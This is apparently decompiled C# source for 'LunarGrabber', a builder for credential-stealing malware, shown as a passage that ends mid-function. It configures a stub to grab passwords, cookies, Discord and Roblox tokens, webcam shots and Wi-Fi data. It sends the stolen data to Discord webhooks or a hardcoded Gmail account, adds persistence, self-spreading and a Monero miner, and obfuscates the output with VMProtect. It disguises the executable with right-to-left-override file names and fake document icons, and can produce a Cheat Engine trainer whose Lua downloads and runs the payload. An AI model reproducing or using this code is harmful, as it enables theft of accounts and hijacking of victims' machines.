using System;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AnonFileAPI;
using AsteroidLLC.Properties;
using Discord;
using Discord.Gateway;
using dnlib.DotNet;
using MailKit.Net.Smtp;
using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Controls;
using MetroFramework.Forms;
using Microsoft.CSharp;
using MimeKit;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Siticone.UI.WinForms;
using Zeroit.Framework.CodeTextBox;

namespace LunarGrabber
{
	// Token: 0x02000017 RID: 23
	public class MainForm : MetroForm
	{
		// Token: 0x06000098 RID: 152 RVA: 0x00005F4E File Offset: 0x0000414E
		public MainForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00005F68 File Offset: 0x00004168
		public static string CreatePaste(string content)
		{
			WebClient webClient = new WebClient();
			string json = webClient.UploadString("https://asteroid.loca.lt/documents", content);
			JToken arg = JObject.Parse(json)["key"];
			return string.Format("https://asteroid.loca.lt/{0}", arg);
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00005FA4 File Offset: 0x000041A4
		private void MainForm_Load(object sender, EventArgs e)
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			this.userLabel.Text = "User: " + User.Username;
			this.expiryLabel.Text = "Expiry: " + User.Expiry;
			MainForm.authusername = (User.Username ?? "");
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			if (Program.GetValue("Red") != null && Program.GetValue("Green") != null && Program.GetValue("Blue") != null)
			{
				this.redTrackBar.Value = int.Parse(Program.GetValue("Red"));
				this.greenTrackBar.Value = int.Parse(Program.GetValue("Green"));
				this.blueTrackBar.Value = int.Parse(Program.GetValue("Blue"));
				this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
			}
			else
			{
				this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
			}
			foreach (object obj in Enum.GetValues(typeof(MetroColorStyle)))
			{
				if (obj.ToString() != "Default")
				{
					this.stylesComboBox.Items.Add(obj.ToString());
				}
			}
			if (Program.GetValue("Color") != null)
			{
				this.stylesComboBox.SelectedIndex = Convert.ToInt32(Program.GetValue("Color"));
				this.components.SetStyle(this, Convert.ToInt32(Program.GetValue("Color")) + 1);
			}
			else
			{
				this.stylesComboBox.SelectedIndex = this.styleManager.Style - 1;
				this.components.SetStyle(this, this.styleManager.Style);
			}
			if (Program.GetValue("Opacity") != null)
			{
				this.opacityTrackBar.Value = Convert.ToInt32(Program.GetValue("Opacity"));
			}
			else
			{
				this.opacityTrackBar.Value = 100;
			}
			if (Program.GetValue("Webhook") != null)
			{
				this.webhookTextBox.Text = Program.GetValue("Webhook");
			}
			if (Program.GetValue("WebhookID") != null)
			{
				this.webhookIDbox.Text = Program.GetValue("WebhookID");
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000624C File Offset: 0x0000444C
		private string ColorToHex(Color color)
		{
			return int.Parse(color.R.ToString("X2") + color.G.ToString("X2") + color.B.ToString("X2"), NumberStyles.HexNumber).ToString();
		}

		// Token: 0x0600009C RID: 156 RVA: 0x000062AC File Offset: 0x000044AC
		private string Options(string code)
		{
			code = code.Replace("webhookUrl", this.webhookTextBox.Text);
			code = code.Replace("WebhookID", this.webhookIDbox.Text);
			code = code.Replace("webhookUrlv2", this.webhookTextBox.Text);
			code = code.Replace("WebhookIDv2", this.webhookIDbox.Text);
			code = code.Replace("hexColor", this.ColorToHex(this.embedColorPictureBox.BackColor));
			code = code.Replace("falsePasswords", this.passwordsCheckBox.Checked.ToString());
			code = code.Replace("falseCookies", this.cookiesCheckBox.Checked.ToString());
			code = code.Replace("falseScreenshot", this.screenshotCheckBox.Checked.ToString());
			code = code.Replace("falseWebcam", this.webcamCheckBox.Checked.ToString());
			code = code.Replace("falseRoblox", this.robloxCheckBox.Checked.ToString());
			code = code.Replace("falseEmail", this.emailCheckBox1.Checked.ToString());
			code = code.Replace("falseWifi", this.wifiCheckBox1.Checked.ToString());
			code = code.Replace("falseDiscord", this.discordCheckBox.Checked.ToString());
			code = code.Replace("falseInternet", this.internetCheckBox1.Checked.ToString());
			code = code.Replace("generatedBy", MainForm.authusername);
			code = code.Replace("stubVersion", "1.8");
			if (this.fakeErrorCheckBox.Checked)
			{
				code = code.Replace("//fakeError", string.Concat(new string[]
				{
					"MessageBox.Show(\"",
					this.errorMessageTextBox.Text,
					"\", \"",
					this.errorTitleTextBox.Text,
					"\", MessageBoxButtons.OK, MessageBoxIcon.Error);"
				}));
			}
			if (this.bsodCheckBox.Checked)
			{
				code = code.Replace("//bsod", "BSOD();");
			}
			if (this.startupCheckBox.Checked)
			{
				code = code.Replace("//startup", "AddToStartup(Assembly.GetExecutingAssembly().Location);");
			}
			if (this.hideGrabberCheckBox.Checked)
			{
				code = code.Replace("//hideGrabber", "File.SetAttributes(Assembly.GetExecutingAssembly().Location, File.GetAttributes(Assembly.GetExecutingAssembly().Location) | FileAttributes.Hidden);");
			}
			if (this.disableInputCheckBox.Checked)
			{
				code = code.Replace("//disableInput", "DisableInput();");
			}
			if (this.autoSpreadCheckBox.Checked)
			{
				code = code.Replace("spreadMessage", this.spreadMessage.Text);
				code = code.Replace("//autoSpread", "AutoSpread();");
			}
			if (this.copyToTempCheckBox.Checked)
			{
				code = code.Replace("//copyToTemp", "CopyToTemp();");
			}
			if (this.moneroMinerCheckBox.Checked)
			{
				code = code.Replace("//moneroMiner", "MoneroMiner();");
				code = code.Replace("pool", this.poolTextBox.Text);
				code = code.Replace("wallet", this.walletTextBox.Text);
			}
			if (!string.IsNullOrEmpty(this.pluginTextBox.Text) && !string.IsNullOrWhiteSpace(this.pluginTextBox.Text))
			{
				code = code.Replace("//pluginCode", this.pluginTextBox.Text);
				code = code.Replace("//plugin", "Plugin();");
			}
			return code;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00006644 File Offset: 0x00004844
		private void Compiler(string code, string path)
		{
			this.compilerOutputTextBox.Text = "[Compiler]> Started compiling..." + Environment.NewLine;
			string text = this.RandomString();
			string text2 = Path.Combine(Path.GetTempPath(), text);
			Directory.CreateDirectory(text2);
			File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
			try
			{
				string text3 = text + ".resources";
				if (this.filesListView.Items.Count > 0)
				{
					this.compilerOutputTextBox.AppendText("[Compiler]> Binding files..." + Environment.NewLine);
					using (ResourceWriter resourceWriter = new ResourceWriter(text3))
					{
						string text4 = string.Empty;
						foreach (object obj in this.filesListView.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							string text5 = this.RandomString();
							resourceWriter.AddResource(text5, File.ReadAllBytes(listViewItem.SubItems[0].Text));
							string text6 = Resources.RunBindedFile;
							text6 = text6.Replace("resourcenamenoextension", text5);
							text6 = text6.Replace("resourcename", text5 + Path.GetExtension(Path.GetExtension(listViewItem.SubItems[0].Text)));
							text4 += text6;
						}
						code = code.Replace("//runfilescode", text4);
						code = code.Replace("resourcesfilename", text);
					}
				}
				string text7 = text2 + "\\" + text + ".exe";
				CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider();
				CompilerParameters compilerParameters = new CompilerParameters();
				this.compilerOutputTextBox.AppendText("[Compiler]> Adding references..." + Environment.NewLine);
				compilerParameters.GenerateExecutable = true;
				compilerParameters.OutputAssembly = text7;
				compilerParameters.TreatWarningsAsErrors = false;
				string[] array = new string[]
				{
					"Anarchy.dll",
					"System.Net.dll",
					"System.Web.dll",
					"System.IO.Compression.FileSystem.dll",
					"AForge.dll",
					"AForge.Video.dll",
					"AForge.Video.DirectShow.dll",
					"System.dll",
					"Leaf.xNet.dll",
					"Newtonsoft.Json.dll",
					"System.Windows.Forms.dll",
					"System.Web.Extensions.dll",
					"System.Net.Http.dll",
					"System.Drawing.dll",
					"System.Linq.dll",
					"System.Core.dll",
					"System.Xml.dll",
					"System.Management.dll",
					"websocket-sharp.dll"
				};
				foreach (string value in array)
				{
					compilerParameters.ReferencedAssemblies.Add(value);
				}
				if (File.Exists(text3))
				{
					compilerParameters.EmbeddedResources.Add(text3);
				}
				compilerParameters.CompilerOptions = "/t:winexe /optimize /unsafe /platform:x86";
				if (this.iconCheckBox.Checked)
				{
					if (!string.IsNullOrEmpty(this.iconPathTextBox.Text) && !string.IsNullOrWhiteSpace(this.iconPathTextBox.Text))
					{
						CompilerParameters compilerParameters2 = compilerParameters;
						compilerParameters2.CompilerOptions = compilerParameters2.CompilerOptions + " /win32icon:\"" + this.iconPathTextBox.Text + "\"";
					}
					else
					{
						this.compilerOutputTextBox.AppendText("[Compiler]> The custom icon path can't be empty");
					}
				}
				if (this.mp4.Checked)
				{
					string str = "Resources/mp4.ico";
					CompilerParameters compilerParameters3 = compilerParameters;
					compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32icon:\"" + str + "\"";
				}
				else if (this.pdf.Checked)
				{
					string str2 = "Resources/pdf.ico";
					CompilerParameters compilerParameters4 = compilerParameters;
					compilerParameters4.CompilerOptions = compilerParameters4.CompilerOptions + " /win32icon:\"" + str2 + "\"";
				}
				else if (this.png.Checked)
				{
					string str3 = "Resources/png.ico";
					CompilerParameters compilerParameters5 = compilerParameters;
					compilerParameters5.CompilerOptions = compilerParameters5.CompilerOptions + " /win32icon:\"" + str3 + "\"";
				}
				else if (this.py.Checked)
				{
					string str4 = "Resources/py.ico";
					CompilerParameters compilerParameters6 = compilerParameters;
					compilerParameters6.CompilerOptions = compilerParameters6.CompilerOptions + " /win32icon:\"" + str4 + "\"";
				}
				else if (this.txt.Checked)
				{
					string str5 = "Resources/txt.ico";
					CompilerParameters compilerParameters7 = compilerParameters;
					compilerParameters7.CompilerOptions = compilerParameters7.CompilerOptions + " /win32icon:\"" + str5 + "\"";
				}
				else if (this.rbxl.Checked)
				{
					string str6 = "Resources/rbxl.ico";
					CompilerParameters compilerParameters8 = compilerParameters;
					compilerParameters8.CompilerOptions = compilerParameters8.CompilerOptions + " /win32icon:\"" + str6 + "\"";
				}
				CompilerResults compilerResults = csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
				{
					code
				});
				csharpCodeProvider.Dispose();
				File.Delete(text3);
				if (compilerResults.Errors.Count > 0)
				{
					foreach (object obj2 in compilerResults.Errors)
					{
						CompilerError compilerError = (CompilerError)obj2;
						this.compilerOutputTextBox.AppendText(string.Format("[Compiler]> {0}, Line: {1}{2}", compilerError.ErrorText, compilerError.Line, Environment.NewLine));
					}
				}
				else
				{
					this.compilerOutputTextBox.AppendText("[Compiler]> Embedding dlls..." + Environment.NewLine);
					ModuleDefMD moduleDefMD = ModuleDefMD.Load(text7, null);
					foreach (AssemblyRef assemblyRef in moduleDefMD.GetAssemblyRefs())
					{
						if (File.Exists(string.Format("{0}.dll", assemblyRef.Name)))
						{
							File.Copy(string.Format("{0}.dll", assemblyRef.Name), string.Format("{0}\\{1}.dll", Path.GetDirectoryName(text7), assemblyRef.Name));
						}
					}
					File.Copy("Leaf.xNet.dll", Path.GetDirectoryName(text7) + "\\Leaf.xNet.dll");
					File.Copy("websocket-sharp.dll", Path.GetDirectoryName(text7) + "\\websocket-sharp.dll");
					moduleDefMD.Dispose();
					string text8 = text2 + "\\" + Path.GetFileNameWithoutExtension(text7) + ".embedded.exe";
					using (Process process = new Process())
					{
						process.StartInfo.WorkingDirectory = "Resources";
						process.StartInfo.FileName = "cmd.exe";
						process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process.StartInfo.Arguments = "/C UltraEmbeddable " + text7 + " " + text8;
						process.Start();
						process.WaitForExit();
					}
					this.compilerOutputTextBox.AppendText("[Compiler]> Obfuscating..." + Environment.NewLine);
					string text9 = text2 + "\\GrabberProject.vmp";
					File.WriteAllBytes(text9, Resources.GrabberProject);
					using (Process process2 = new Process())
					{
						process2.StartInfo.WorkingDirectory = "Resources";
						process2.StartInfo.FileName = "cmd.exe";
						process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						process2.StartInfo.Arguments = string.Concat(new string[]
						{
							"/C VMProtect_Con ",
							text8,
							" \"",
							path,
							"\" -pf ",
							text9
						});
						process2.Start();
						process2.WaitForExit();
					}
					File.Delete(text9);
					if (this.filePumperCheckBox.Checked)
					{
						this.compilerOutputTextBox.AppendText("[Compiler]> Pumping the grabber..." + Environment.NewLine);
						int value2;
						if (!int.TryParse(this.pumpAmountTextBox.Text, out value2))
						{
							this.compilerOutputTextBox.AppendText("[Compiler]> Your file pump amount is invalid!");
							return;
						}
						FileStream fileStream = File.OpenWrite(path);
						long num = fileStream.Seek(0L, SeekOrigin.End);
						long num2 = Convert.ToInt64(value2);
						decimal d = 0m;
						if (this.byteCheckBox.Checked)
						{
							d = num + num2 * 2L;
						}
						else if (this.kiloByteCheckBox.Checked)
						{
							d = num + num2 * 1024L;
						}
						else if (this.megaByteCheckBox.Checked)
						{
							d = num + num2 * 1048576L;
						}
						while (num < d)
						{
							num += 1L;
							fileStream.WriteByte(0);
						}
						fileStream.Close();
					}
					if (this.cetrainerCheckBox.Checked)
					{
						AnonFileWrapper anonFileWrapper = new AnonFileWrapper();
						AnonFile anonFile = anonFileWrapper.UploadFile(path);
						string directDownloadLinkFromLink = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl, "download-url");
						string str7 = string.Concat(new string[]
						{
							"local int = getInternet() local url = '",
							directDownloadLinkFromLink,
							"' local download_file = int.getURL(url) local dir = os.getenv('USERPROFILE') .. '\\\\AppData\\\\Roaming\\\\' local file_name = dir .. '",
							Path.GetFileNameWithoutExtension(path),
							".exe' local file = io.open(file_name, 'wb') file:write(download_file) file:close() int.destroy() shellExecute(file_name)"
						});
						File.WriteAllText(path, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"34\">\n<CheatEntries/>\n<UserdefinedSymbols/>\n<LuaScript>\n\n" + str7 + "\n\n</LuaScript>\n</CheatTable>");
					}
					this.compilerOutputTextBox.AppendText("[Compiler]> Grabber saved at: " + path + "!");
				}
			}
			catch (Exception ex)
			{
				if (Directory.Exists(text2))
				{
					Directory.Delete(text2, true);
				}
				this.compilerOutputTextBox.AppendText("[Compiler]> " + ex.Message);
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00006FFC File Offset: 0x000051FC
		public static byte[] Compress(byte[] data)
		{
			MemoryStream memoryStream = new MemoryStream();
			using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionLevel.Optimal))
			{
				deflateStream.Write(data, 0, data.Length);
			}
			return memoryStream.ToArray();
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00007044 File Offset: 0x00005244
		private string RandomString()
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890", 8)
			select s[this.random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890".Length)]).ToArray<char>());
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x0000706C File Offset: 0x0000526C
		private void compileButton_Click(object sender, EventArgs e)
		{
			Program.SetValue("Red", this.redTrackBar.Value.ToString());
			Program.SetValue("Green", this.greenTrackBar.Value.ToString());
			Program.SetValue("Blue", this.blueTrackBar.Value.ToString());
			Program.SetValue("Webhook", this.webhookTextBox.Text);
			Program.SetValue("WebhookID", this.webhookIDbox.Text);
			string code = this.Options(Resources.Code);
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				if (!this.cetrainerCheckBox.Checked)
				{
					if (this.mp4.Checked)
					{
						string str = "‮";
						saveFileDialog.FileName = this.appname.Text + str + "4pm.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else if (this.pdf.Checked)
					{
						string str2 = "‮";
						saveFileDialog.FileName = this.appname.Text + str2 + "fdp.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else if (this.png.Checked)
					{
						string str3 = "‮";
						saveFileDialog.FileName = this.appname.Text + str3 + "gnp.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else if (this.py.Checked)
					{
						string str4 = "‮";
						saveFileDialog.FileName = this.appname.Text + str4 + "yp.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else if (this.txt.Checked)
					{
						string str5 = "‮";
						saveFileDialog.FileName = this.appname.Text + str5 + "txt.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else if (this.rbxl.Checked)
					{
						string str6 = "‮";
						saveFileDialog.FileName = this.appname.Text + str6 + "lxbr.";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					else
					{
						saveFileDialog.FileName = "Runtime.exe";
						saveFileDialog.Filter = "Exe Files (.exe)|*.exe";
					}
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						this.Compiler(code, saveFileDialog.FileName);
					}
				}
				else
				{
					saveFileDialog.FileName = "Runtime.CETRAINER";
					saveFileDialog.Filter = "Cetrainer Files (.CETRAINER)|*.CETRAINER";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						this.Compiler(code, saveFileDialog.FileName);
					}
				}
			}
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x0000731C File Offset: 0x0000551C
		private void chooseIconButton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Ico Files (.ico)|*.ico";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.iconPathTextBox.Text = openFileDialog.FileName;
				this.iconPictureBox.Image = Image.FromFile(this.iconPathTextBox.Text);
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00007370 File Offset: 0x00005570
		private string Decrypt(string cipherText)
		{
			byte[] array = Convert.FromBase64String(cipherText);
			string @string;
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				rijndaelManaged.Key = Encoding.UTF8.GetBytes("VWmehqdrF6nzsmhHVaowiu6bqEV6X6dm");
				rijndaelManaged.IV = Encoding.UTF8.GetBytes("jkhdtTnMzI8bcYsC");
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
				{
					@string = Encoding.Unicode.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
				}
			}
			return @string;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x000026EB File Offset: 0x000008EB
		private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			Environment.Exit(1);
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00007434 File Offset: 0x00005634
		private void iconCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.iconPathTextBox.Enabled = (sender as MetroCheckBox).Checked;
			this.chooseIconButton.Enabled = (sender as MetroCheckBox).Checked;
			this.iconPictureBox.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00007484 File Offset: 0x00005684
		private void filePumperCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.pumpAmountTextBox.Enabled = (sender as MetroCheckBox).Checked;
			this.byteCheckBox.Enabled = (sender as MetroCheckBox).Checked;
			this.kiloByteCheckBox.Enabled = (sender as MetroCheckBox).Checked;
			this.megaByteCheckBox.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x000074E9 File Offset: 0x000056E9
		private void fakeErrorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.errorTitleTextBox.Enabled = (sender as MetroCheckBox).Checked;
			this.errorMessageTextBox.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00007518 File Offset: 0x00005718
		private void embedColorCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.Enabled = (sender as MetroCheckBox).Checked;
			this.redTrackBar.Enabled = (sender as MetroCheckBox).Checked;
			this.greenTrackBar.Enabled = (sender as MetroCheckBox).Checked;
			this.blueTrackBar.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x0000757D File Offset: 0x0000577D
		private void autoSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.spreadMessage.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00007598 File Offset: 0x00005798
		private void colorsComboBox_SelectedIndexChanged(object sender, EventArgs e)
		{
			Program.SetValue("Color", this.stylesComboBox.SelectedIndex.ToString());
			this.components.SetStyle(this, Convert.ToInt32(Program.GetValue("Color")) + 1);
		}

		// Token: 0x060000AA RID: 170 RVA: 0x000075DF File Offset: 0x000057DF
		private void bitcoinMinerCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.poolTextBox.Enabled = (sender as MetroCheckBox).Checked;
			this.walletTextBox.Enabled = (sender as MetroCheckBox).Checked;
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00007610 File Offset: 0x00005810
		private void opacityTrackBar_ValueChanged(object sender, EventArgs e)
		{
			base.Opacity = (double)(sender as MetroTrackBar).Value / 100.0;
			Program.SetValue("Opacity", (sender as MetroTrackBar).Value.ToString());
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00007658 File Offset: 0x00005858
		private bool ValidToken(string token)
		{
			bool result;
			try
			{
				DiscordClient discordClient = new DiscordClient(token, new DiscordConfig
				{
					RetryOnRateLimit = true
				});
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00007694 File Offset: 0x00005894
		private void redTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00007694 File Offset: 0x00005894
		private void greenTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00007694 File Offset: 0x00005894
		private void blueTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x000076C8 File Offset: 0x000058C8
		private void addButton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "All files (*.*)|*.*";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.filesListView.Items.Add(new ListViewItem(new string[]
				{
					openFileDialog.FileName,
					string.Format("{0} KB", new FileInfo(openFileDialog.FileName).Length / 1024L)
				}));
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x0000773D File Offset: 0x0000593D
		private void removeButton_Click(object sender, EventArgs e)
		{
			if (this.filesListView.SelectedItems.Count > 0)
			{
				this.filesListView.Items.Remove(this.filesListView.SelectedItems[0]);
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void webhookTextBox_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00007774 File Offset: 0x00005974
		private void testWebhookButton_Click_1(object sender, EventArgs e)
		{
			if (this.emailCheckBox1.Checked)
			{
				string text = this.webhookTextBox.Text;
				string text2 = "claimAsteroidLLC@gmail.com";
				string text3 = "claimAsteroidLLCclaimAsteroidLLC";
				MimeMessage mimeMessage = new MimeMessage();
				mimeMessage.From.Add(new MailboxAddress("Asteroid LLC", text2));
				mimeMessage.To.Add(new MailboxAddress("", text));
				mimeMessage.Subject = "Asteroid LLC - SUBJECT";
				mimeMessage.Body = new TextPart("plain")
				{
					Text = "Asteroid LLC - BODY"
				};
				try
				{
					using (SmtpClient smtpClient = new SmtpClient())
					{
						smtpClient.Connect("smtp.gmail.com", 587, 1, default(CancellationToken));
						smtpClient.AuthenticationMechanisms.Remove("XOAUTH2");
						smtpClient.Authenticate(text2, text3, default(CancellationToken));
						smtpClient.Send(mimeMessage, default(CancellationToken), null);
						smtpClient.Disconnect(true, default(CancellationToken));
						MessageBox.Show("Email was successfully delivered to: " + text);
					}
					return;
				}
				catch (IOException ex)
				{
					MessageBox.Show("An exception occoured while delivering the email to: " + text);
					MessageBox.Show(ex.ToString());
					return;
				}
			}
			try
			{
				string text4 = "https://discord.com/api/webhooks/id/text";
				string text5 = text4.Replace("id", this.webhookIDbox.Text);
				string address = text5.Replace("text", this.webhookTextBox.Text);
				new WebClient().UploadValues(address, new NameValueCollection
				{
					{
						"content",
						"Webhook is available!"
					},
					{
						"username",
						"Asteroid LLC"
					}
				});
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Webhook is invalid!", "Asteroid LLC");
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void optionsTab_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void metroButton5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void metroTabPage2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00007964 File Offset: 0x00005B64
		private void mp4_CheckedChanged(object sender, EventArgs e)
		{
			if (this.pdf.Checked)
			{
				this.pdf.Checked = false;
			}
			if (this.png.Checked)
			{
				this.png.Checked = false;
			}
			if (this.py.Checked)
			{
				this.py.Checked = false;
			}
			if (this.txt.Checked)
			{
				this.txt.Checked = false;
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x000079D8 File Offset: 0x00005BD8
		private void pdf_CheckedChanged(object sender, EventArgs e)
		{
			if (this.mp4.Checked)
			{
				this.mp4.Checked = false;
			}
			if (this.png.Checked)
			{
				this.png.Checked = false;
			}
			if (this.py.Checked)
			{
				this.py.Checked = false;
			}
			if (this.txt.Checked)
			{
				this.txt.Checked = false;
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00007A4C File Offset: 0x00005C4C
		private void png_CheckedChanged(object sender, EventArgs e)
		{
			if (this.pdf.Checked)
			{
				this.pdf.Checked = false;
			}
			if (this.mp4.Checked)
			{
				this.mp4.Checked = false;
			}
			if (this.py.Checked)
			{
				this.py.Checked = false;
			}
			if (this.txt.Checked)
			{
				this.txt.Checked = false;
			}
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00007AC0 File Offset: 0x00005CC0
		private void py_CheckedChanged(object sender, EventArgs e)
		{
			if (this.mp4.Checked)
			{
				this.mp4.Checked = false;
			}
			if (this.png.Checked)
			{
				this.png.Checked = false;
			}
			if (this.pdf.Checked)
			{
				this.pdf.Checked = false;
			}
			if (this.txt.Checked)
			{
				this.txt.Checked = false;
			}
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00007B34 File Offset: 0x00005D34
		private void txt_CheckedChanged(object sender, EventArgs e)
		{
			if (this.mp4.Checked)
			{
				this.mp4.Checked = false;
			}
			if (this.png.Checked)
			{
				this.png.Checked = false;
			}
			if (this.py.Checked)
			{
				this.py.Checked = false;
			}
			if (this.pdf.Checked)
			{
				this.pdf.Checked = false;
			}
		}

		// Token: 0x060000BC RID: 188 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void compilerTab_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000BD RID: 189 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void groupBox3_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x060000BE RID: 190 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void rbxl_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060000BF RID: 191 RVA: 0x00007BA8 File Offset: 0x00005DA8
		private void metroButton3_Click(object sender, EventArgs e)
		{
			string text = this.rblxc.Text;
			WebClient webClient = new WebClient();
			string value = ".ROBLOSECURITY=" + text;
			webClient.Headers["Cookie"] = value;
			if (webClient.DownloadString("http://www.roblox.com/mobileapi/userinfo").Contains("ThumbnailUrl"))
			{
				MainForm.JsonReader jsonReader = JsonConvert.DeserializeObject<MainForm.JsonReader>(webClient.DownloadString("http://www.roblox.com/mobileapi/userinfo"));
				string content = MainForm.CreatePaste(text);
				long userID = jsonReader.UserID;
				string content2 = Convert.ToString(userID);
				string userName = jsonReader.UserName;
				long robuxBalance = jsonReader.RobuxBalance;
				string str = Convert.ToString(robuxBalance);
				bool isAnyBuildersClubMember = jsonReader.IsAnyBuildersClubMember;
				string content3 = Convert.ToString(isAnyBuildersClubMember);
				string thumbnailUrl = jsonReader.ThumbnailUrl;
				try
				{
					DiscordSocketClient client = new DiscordSocketClient(null);
					EmbedMaker embedMaker = new EmbedMaker();
					embedMaker.Title = "Asteroid LLC | ROBLOX Account Checker";
					embedMaker.ThumbnailUrl = thumbnailUrl;
					embedMaker.AddField("Username: ", userName, false);
					embedMaker.AddField("UserID: ", content2, false);
					embedMaker.AddField("Balance: ", str + " R$", false);
